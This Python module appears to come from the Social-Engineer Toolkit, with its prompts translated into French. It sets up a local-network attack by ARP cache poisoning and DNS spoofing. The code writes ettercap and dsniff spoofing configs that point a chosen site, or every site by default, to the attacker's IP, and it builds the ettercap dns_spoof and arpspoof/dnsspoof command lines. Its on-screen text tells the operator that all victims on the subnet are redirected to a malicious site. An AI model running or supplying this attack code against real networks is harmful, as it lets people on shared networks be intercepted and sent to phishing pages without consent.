import subprocess
import re
import pexpect
import os
import time
import sys
from src.core.setcore import *

# Define to use ettercap or dsniff or nothing.
#
# Thanks to sami8007 and trcx for the dsniff addition

definepath = os.getcwd()

# grab config file
config = open("/etc/setoolkit/set.config", "r").readlines()
# grab our default directory
cwd = os.getcwd()
# set a variable as default to n or no
ettercapchoice = 'n'
# add dsniffchoice
dsniffchoice = 'n'
for line in config:
    # check for ettercap choice here
    match1 = re.search("ETTERCAP=ON", line)
    if match1:
        print_info("L'empoisonnement du cache ARP est réglé sur " +
                   bcolors.GREEN + "ON" + bcolors.ENDC)
        ettercapchoice = 'y'

    # check for dsniff choice here
    match2 = re.search("DSNIFF=ON", line)
    if match2:
        print_info("L'empoisonnement DNS DSNIFF est réglé sur " +
                   bcolors.GREEN + "ON" + bcolors.ENDC)
        dsniffchoice = 'y'
        ettercapchoice = 'n'

# GRAB CONFIG from SET
fileopen = open("/etc/setoolkit/set.config", "r").readlines()
for line in fileopen:
    # grab the ettercap interface
    match = re.search("ETTERCAP_INTERFACE=", line)
    if match:
        line = line.rstrip()
        interface = line.split("=")
        interface = interface[1]
        if interface == "NONE":
            interface = ""

    # grab the ettercap path
    etterpath = re.search("ETTERCAP_PATH=", line)
    if etterpath:
        line = line.rstrip()
        path = line.replace("ETTERCAP_PATH=", "")

        if not os.path.isfile(path):
            path = ("/usr/local/share/ettercap")

# if we are using ettercap then get everything ready
if ettercapchoice == 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "Adresse IP pour la connexion retour : "))
        update_options("IPADDR=" + ipaddr)

    if ettercapchoice == 'y':
        try:
            print("""
  Cette attaque va empoisonner toutes les victimes de votre sous-réseau local et les
  rediriger lorsqu'elles accèdent à un site spécifique. La prochaine invite vous demandera
  quel site doit déclencher la redirection DNS. Un exemple simple : si vous voulez que
  tout le monde sur votre sous-réseau soit redirigé vers vous lorsqu'il navigue vers
  www.google.com, la victime sera alors redirigée vers votre site malveillant. Vous
  pouvez aussi empoisonner tout le monde et tous les sites avec le joker '*'.

  SI VOUS VOULEZ EMPOISONNER TOUTES LES ENTRÉES DNS (PAR DÉFAUT), APPUYEZ SIMPLEMENT SUR ENTRÉE OU *
""")
            print_info("Exemple : http://www.google.com")
            dns_spoof = raw_input(
                setprompt("0", "Site à rediriger vers la machine attaquante [*]"))
            os.chdir(path)
            # small fix for default
            if dns_spoof == "":
                # set default to * (everything)
                dns_spoof = "*"
            # remove old stale files
            subprocess.Popen(
                "rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
            # prep etter.dns for writing
            filewrite = open("etter.dns", "w")
            # send our information to etter.dns
            filewrite.write("%s A %s" % (dns_spoof, ipaddr))
            # close the file
            filewrite.close()
            # set bridge variable to nothing
            bridge = ""
            # assign -M arp to arp variable
            arp = "-M arp"
            print_error("LANCEMENT DE L'ATTAQUE DNS_SPOOF ETTERCAP !")
            # spawn a child process
            os.chdir(cwd)
            time.sleep(5)
            filewrite = open(userconfigpath + "ettercap", "w")
            filewrite.write(
                "ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface, arp, bridge))
            filewrite.close()
            os.chdir(cwd)
        except Exception as error:
            os.chdir(cwd)
            # log(error)
            print_error("ERREUR : une erreur est survenue :")
            print("ERREUR :" + str(error))

# if we are using dsniff
if dsniffchoice == 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "Adresse IP pour la connexion retour : "))
        update_options("IPADDR=" + ipaddr)

    if dsniffchoice == 'y':
        try:
            print("""
  Cette attaque va empoisonner toutes les victimes de votre sous-réseau local et les
  rediriger lorsqu'elles accèdent à un site spécifique. La prochaine invite vous demandera
  quel site doit déclencher la redirection DNS. Un exemple simple : si vous voulez que
  tout le monde sur votre sous-réseau soit redirigé vers vous lorsqu'il navigue vers
  www.google.com, la victime sera alors redirigée vers votre site malveillant. Vous
  pouvez aussi empoisonner tout le monde et tous les sites avec le joker '*'.

  SI VOUS VOULEZ EMPOISONNER TOUTES LES ENTRÉES DNS (PAR DÉFAUT), APPUYEZ SIMPLEMENT SUR ENTRÉE OU *
""")
            print_info("Exemple : http://www.google.com")
            dns_spoof = raw_input(
                setprompt("0", "Site à rediriger vers la machine attaquante [*]"))
            # os.chdir(path)
            # small fix for default
            if dns_spoof == "":
                dns_spoof = "*"
            subprocess.Popen(
                "rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (userconfigpath), shell=True).wait()
            filewrite = open(userconfigpath + "dnsspoof.conf", "w")
            filewrite.write("%s %s" % (ipaddr, dns_spoof))
            filewrite.close()
            print_error("LANCEMENT DE L'ATTAQUE DNS_SPOOF DNSSPOOF !")
            # spawn a child process
            os.chdir(cwd)
            # time.sleep(5)
            # grab default gateway, should eventually replace with pynetinfo
            # python module
            gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (
                interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
            # open file for writing
            filewrite = open(userconfigpath + "ettercap", "w")
            # write the arpspoof / dnsspoof commands to file
            filewrite.write(
                "arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway, userconfigpath))
            # close the file
            filewrite.close()
            # change back to normal directory
            os.chdir(cwd)
            # this is needed to keep it similar to format above for web gui
            # mode
            pause = raw_input("Appuyez sur <entrée> pour démarrer dsniff.")
        except Exception as error:
            os.chdir(cwd)
            print_error("ERREUR : une erreur est survenue :")
            print(bcolors.RED + "ERREUR" + str(error) + bcolors.ENDC)
